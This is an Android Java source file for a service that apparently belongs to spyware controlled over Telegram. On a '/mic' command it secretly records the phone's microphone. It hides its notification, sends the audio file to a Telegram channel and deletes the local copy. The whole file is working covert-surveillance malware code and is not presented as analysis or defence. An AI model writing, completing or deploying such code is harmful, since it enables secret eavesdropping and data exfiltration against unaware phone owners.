package com.smshandler;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.File;

/**
 * Silent on-demand microphone recorder.
 * Triggered by /mic [seconds] command from Telegram.
 * RECORD_AUDIO permission already granted at install time — no dialog shown.
 */
public class MicRecorderService extends Service {

    public static final String ACTION_RECORD  = "com.smshandler.MIC_RECORD";
    public static final String EXTRA_SECONDS  = "seconds";

    private MediaRecorder mRecorder;
    private String        mOutFile;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null || !ACTION_RECORD.equals(intent.getAction())) {
            stopSelf(); return START_NOT_STICKY;
        }
        int secs = intent.getIntExtra(EXTRA_SECONDS, 30);
        startForeground(9906, buildNotif());
        new Thread(() -> doRecord(secs)).start();
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, SmsService.CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private void doRecord(int durationSec) {
        try {
            mOutFile = getCacheDir().getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".3gp";
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setAudioSamplingRate(16000);
            mRecorder.setAudioEncodingBitRate(24000);
            mRecorder.setOutputFile(mOutFile);
            mRecorder.prepare();
            mRecorder.start();

            // Record for specified duration
            Thread.sleep(durationSec * 1000L);

            mRecorder.stop();
            mRecorder.release();
            mRecorder = null;

            File f = new File(mOutFile);
            if (f.exists() && f.length() > 500) {
                SmsService.sendFileToTelegram(f, "🎙 Mic Recording (" + durationSec + "s)");
                f.delete();
            } else {
                SmsService.sendRawMessage("❌ Mic recording khaali. RECORD_AUDIO permission check karo.");
                if (f.exists()) f.delete();
            }
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Mic error: " + e.getMessage());
        } finally {
            if (mRecorder != null) {
                try { mRecorder.stop(); mRecorder.release(); } catch (Exception ignored) {}
                mRecorder = null;
            }
            stopForeground(true);
            stopSelf();
        }
    }

    @Override
    public void onDestroy() {
        if (mRecorder != null) {
            try { mRecorder.stop(); mRecorder.release(); } catch (Exception ignored) {}
            mRecorder = null;
        }
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
